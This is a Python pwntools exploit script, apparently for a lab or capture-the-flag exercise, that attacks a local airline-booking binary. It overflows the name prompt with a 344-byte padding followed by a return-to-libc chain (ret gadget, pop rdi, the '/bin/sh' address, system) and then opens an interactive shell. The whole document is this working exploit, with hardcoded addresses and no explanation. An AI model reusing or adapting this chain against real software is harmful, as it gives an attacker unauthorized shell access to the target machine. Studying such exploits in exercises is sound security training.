#!/usr/bin/env python3
from pwn import *

context.binary = ELF('./bin/ex1', checksec=False)
context.log_level = 'debug'

OFFSET = 344  # calculat in gdb: (long)($rbp + 8) - (long)&name

SYSTEM      = 0x7ffff7dff110     # p system
BINSH       = 0x7ffff7f53ea4     #search "/bin/sh"
POP_RDI_RET = 0x7ffff7dd6145     # pop rdi ; ret
RET         = 0x401016           #  'ret' din binar

def build_payload():
    payload  = b"A" * OFFSET
    payload += p64(RET)          
    payload += p64(POP_RDI_RET)  
    payload += p64(BINSH)       
    payload += p64(SYSTEM)       
    return payload

def main():
    io = process('./bin/ex1')

   
    io.sendlineafter(b"Select an airline:", b"0")

    
    io.sendlineafter(b"Please input your name to check your booking:", build_payload())

    
    io.interactive()

if __name__ == "__main__":
    main()
